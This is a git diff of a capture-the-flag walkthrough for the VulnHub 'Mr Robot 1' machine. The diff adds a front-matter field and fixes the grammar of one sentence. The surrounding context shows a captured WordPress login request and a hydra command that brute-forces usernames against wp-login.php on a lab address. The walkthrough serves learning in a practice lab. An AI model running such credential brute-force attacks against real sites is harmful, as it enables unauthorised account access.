@@ -4,6 +4,7 @@ title: CTF Walkthrough with mrrobot 1
 date: 2018-09-15
 catagories: CTF
 description: Walkthrough with the CTF mrrobot:https://www.vulnhub.com/entry/mr-robot-1,151
+img-url: ''
 comments: true
 ---
 
@@ -127,7 +128,7 @@ POST /wp-login.php HTTP/1.0
 log=WeirdUsernamel&pwd=WeirdPasswd&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.2.106%2Fwp-admin%2F&testcookie=1
 ```
 
-Rather than attack the page with username and password in the same time (it take too many time), we first, check a valid username like wordpress generate an error when username is good and password not.
+Rather than attack the page with username and password in the same time (it takes too long), we first, check a valid username like wordpress generate an error when username is good and password not.
 
     $ hydra -V -L fsociety_sort.dic -p test -f 192.168.2.106 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.2.106%2Fwp-admin%2F&testcookie=1:Bad Loggin' 1&>log.txt
 
